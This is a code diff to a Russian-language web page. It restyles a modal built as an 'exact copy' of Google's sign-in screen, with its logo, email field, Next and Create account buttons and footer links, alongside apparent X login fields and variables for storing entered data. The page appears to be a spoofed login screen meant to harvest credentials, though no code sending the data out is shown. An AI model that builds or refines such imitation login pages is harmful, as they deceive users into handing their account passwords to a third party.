@@ -639,7 +639,7 @@
             font-family: Arial, sans-serif;
         }
         
-        /* Стили для Google формы */
+        /* Стили для Google формы (как на скриншоте IMG_0686.png) */
         .google-icon {
             width: 40px;
             height: 40px;
@@ -655,17 +655,15 @@
             font-family: Arial, sans-serif;
         }
         
-        /* Новые стили для Google формы на основе скриншота */
+        .google-login-page {
+            display: flex;
+            flex-direction: column;
+            min-height: 500px;
+        }
+        
         .google-header {
             text-align: center;
             margin-bottom: 25px;
-        }
-        
-        .google-logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #000;
-            margin-bottom: 15px;
         }
         
         .google-title {
@@ -673,71 +671,11 @@
             font-weight: 500;
             color: #202124;
             margin-bottom: 20px;
-        }
-        
-        .google-account-btn {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            background: white;
-            color: #000;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-account-btn:hover {
-            background: #f8f9fa;
-        }
-        
-        .google-account-icon {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 10px;
-            color: #5f6368;
-            font-weight: bold;
-        }
-        
-        .google-or {
             text-align: center;
-            margin: 20px 0;
-            color: #5f6368;
-            font-size: 14px;
-            position: relative;
         }
         
-        .google-or::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            width: 45%;
-            height: 1px;
-            background: #dadce0;
-        }
-        
-        .google-or::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            right: 0;
-            width: 45%;
-            height: 1px;
-            background: #dadce0;
-        }
-        
-        .google-or span {
-            background: white;
-            padding: 0 10px;
+        .google-input-group {
+            margin-bottom: 20px;
         }
         
         .google-email-input {
@@ -750,7 +688,7 @@
             font-family: Arial, sans-serif;
         }
         
-        .google-forgot {
+        .google-forgot-link {
             display: block;
             text-align: center;
             color: #1a73e8;
@@ -758,6 +696,7 @@
             margin: 15px 0;
             font-size: 14px;
             font-weight: 500;
+            font-family: Arial, sans-serif;
         }
         
         .google-guest-mode {
@@ -765,6 +704,7 @@
             color: #5f6368;
             margin: 20px 0;
             line-height: 1.5;
+            font-family: Arial, sans-serif;
         }
         
         .google-guest-mode a {
@@ -772,32 +712,67 @@
             text-decoration: none;
         }
         
+        .google-footer {
+            margin-top: auto;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
         .google-footer-links {
             display: flex;
             justify-content: space-between;
-            margin-top: 30px;
-            border-top: 1px solid #dadce0;
-            padding-top: 15px;
+            align-items: center;
+            margin-top: 20px;
         }
         
         .google-language {
             color: #5f6368;
             font-size: 12px;
+            font-family: Arial, sans-serif;
         }
         
         .google-help-links {
             display: flex;
-            gap: 20px;
+            gap: 15px;
         }
         
         .google-help-links a {
             color: #5f6368;
             text-decoration: none;
             font-size: 12px;
+            font-family: Arial, sans-serif;
         }
         
         .google-help-links a:hover {
             text-decoration: underline;
+        }
+        
+        .google-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .google-create-account {
+            padding: 10px 16px;
+            background: white;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            cursor: pointer;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
         }
         
         .footer {
@@ -825,7 +800,7 @@
             font-size: 14px;
             transition: color 0.3s;
             font-weight: 400;
-            font-family: 'Orbitron', sans-serif; /* Исправлен шрифт */
+            font-family: 'Orbitron', sans-serif;
         }
         
         .footer-link:hover {
@@ -838,7 +813,7 @@
             margin-top: 10px;
             line-height: 1.5;
             font-weight: 400;
-            font-family: 'Orbitron', sans-serif; /* Исправлен шрифт */
+            font-family: 'Orbitron', sans-serif;
         }
         
         .notification {
@@ -910,6 +885,16 @@
             .logo {
                 margin-left: 20px;
                 font-size: 18px;
+            }
+            
+            .google-buttons {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .google-create-account,
+            .google-next-btn {
+                width: 100%;
             }
         }
     </style>
@@ -1220,7 +1205,7 @@
         </div>
     </div>
     
-    <!-- Google (обновленная версия на основе скриншота) -->
+    <!-- Google (точная копия со скриншота IMG_0686.png) -->
     <div class="login-modal" id="googleLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
@@ -1228,51 +1213,47 @@
                     <i class="fas fa-arrow-left"></i> Назад
                 </button>
             </div>
-            <div class="login-modal-body">
+            <div class="login-modal-body google-login-page">
                 <div class="google-header">
-                    <div class="google-logo">
-                        G
-                    </div>
+                    <div class="google-icon">G</div>
                     <div class="google-title">Вход</div>
                 </div>
                 
-                <button class="google-account-btn" onclick="selectGoogleAccount()">
-                    <div class="google-account-icon">
-                        <i class="fas fa-user-circle" style="font-size: 18px;"></i>
-                    </div>
-                    <span>Используйте аккаунт Google</span>
-                </button>
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="font-size: 16px; color: #202124; margin-bottom: 20px;">Используйте аккаунт Google</div>
+                </div>
                 
-                <div class="google-or">
+                <div class="login-divider" style="margin: 15px 0;">
                     <span>или</span>
                 </div>
                 
-                <input type="text" class="google-email-input" id="googleEmailInput" placeholder="Телефон или адрес эл. почты">
+                <div class="google-input-group">
+                    <input type="text" class="google-email-input" id="googleEmail" placeholder="Телефон или адрес эл. почты">
+                </div>
                 
-                <a href="#" class="google-forgot" onclick="googleForgotEmail()">Забыли адрес электронной почты?</a>
+                <a href="#" class="google-forgot-link" onclick="googleForgotEmail()">Забыли адрес электронной почты?</a>
                 
                 <p class="google-guest-mode">
-                    Работаете на чужом компьютере? Используйте режим "Частный доступ". 
-                    <a href="#" onclick="googleGuestMode()">Подробнее об использовании гостевого режима</a>
+                    Работаете на чужом компьютере? Используйте режим "Частный доступ". <a href="#" onclick="googleGuestMode()">Подробнее об использовании гостевого режима</a>
                 </p>
                 
-                <div style="display: flex; justify-content: space-between; margin-top: 30px;">
-                    <button style="padding: 10px 16px; background: white; color: #1a73e8; border: 1px solid #dadce0; border-radius: 4px; cursor: pointer; font-weight: 500;" onclick="googleCreateAccount()">
+                <div class="google-buttons">
+                    <button class="google-create-account" onclick="googleCreateAccount()">
                         Создать аккаунт
                     </button>
-                    <button class="login-btn" onclick="submitGoogleLogin()" style="background: #1a73e8; width: auto; padding: 10px 24px;">
+                    <button class="google-next-btn" onclick="submitGoogleLogin()">
                         Далее
                     </button>
                 </div>
                 
-                <div class="google-footer-links">
-                    <div class="google-language">
-                        Русский
-                    </div>
-                    <div class="google-help-links">
-                        <a href="#" onclick="googleHelp()">Справка</a>
-                        <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
-                        <a href="#" onclick="googleTerms()">Условия</a>
+                <div class="google-footer">
+                    <div class="google-footer-links">
+                        <div class="google-language">Русский</div>
+                        <div class="google-help-links">
+                            <a href="#" onclick="googleHelp()">Справка</a>
+                            <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
+                            <a href="#" onclick="googleTerms()">Условия</a>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -1335,7 +1316,7 @@
             const xPasswordInput = document.getElementById('xPassword');
             
             // Элементы для Google
-            const googleEmailInput = document.getElementById('googleEmailInput');
+            const googleEmailInput = document.getElementById('googleEmail');
             
             // Переменные для хранения данных
             let xUsername = '';
@@ -1396,16 +1377,12 @@
             };
             
             // Функции для Google
-            window.selectGoogleAccount = function() {
-                showNotification("Функция выбора аккаунта Google");
-            };
-            
             window.googleForgotEmail = function() {
-                showNotification("Функция восстановления email");
+                showNotification("Функция восстановления email Google");
             };
             
             window.googleGuestMode = function() {
-                showNotification("Информация о гостевом режиме");
+                showNotification("Информация о гостевом режиме Google");
             };
             
             window.googleCreateAccount = function() {
